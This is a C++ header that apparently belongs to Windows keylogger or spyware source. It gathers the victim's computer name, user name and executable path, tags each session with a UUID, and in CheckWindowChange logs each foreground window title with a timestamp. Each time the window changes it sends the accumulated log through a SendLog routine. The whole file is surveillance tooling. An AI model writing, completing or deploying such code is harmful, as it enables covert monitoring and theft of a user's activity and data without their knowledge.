#pragma once

string last_window = "";
string Uuid = "00000000-0000-0000-0000-000000000000";

string GetCurrentDate() {
    char timestamp[20];
    time_t now = time(nullptr);
    struct tm tstruct = *localtime(&now);

    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %X", &tstruct);
    return timestamp;
}

string GetComputername() {
    TCHAR strComputerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computername_len = sizeof(strComputerName);
    return !GetComputerName(strComputerName, &computername_len) ? "Unknown" : strComputerName;
}

string GetCurrentPath() {
    TCHAR buffer[MAX_PATH];
    GetModuleFileName(nullptr, buffer, MAX_PATH);
    return buffer;
}

string GetUsername() {
    TCHAR strUsername[512];
    DWORD username_len = sizeof(strUsername);
    return !GetUserName(strUsername, &username_len) ? "Unknown" : strUsername;
}

string GenerateUUID() {
    stringstream ss;
    srand((unsigned int)time(nullptr));

    for (int i = 0; i < 32; i++) {
        ss << uppercase << hex << rand() % 16;
        if (i == 7 || i == 11 || i == 15 || i == 19) ss << '-';
    }
    return ss.str();
}

void CheckWindowChange(string &log_text) {
    TCHAR window_title[512];
    string current_window = "Unknown";

    if (GetWindowText(GetForegroundWindow(), window_title, sizeof(window_title))) {
        current_window = window_title;
        current_window.erase(remove(current_window.begin(), current_window.end(), '*'), current_window.end());
        current_window.erase(remove(current_window.begin(), current_window.end(), '?'), current_window.end());
    }

    if (last_window == current_window)
        return;

    SendLog(log_text, GetCurrentDate());

    log_text += "[" + Uuid + "] :: [" + current_window + "] :: [" + GetCurrentDate() + "]\r\n";
    last_window = current_window;
}
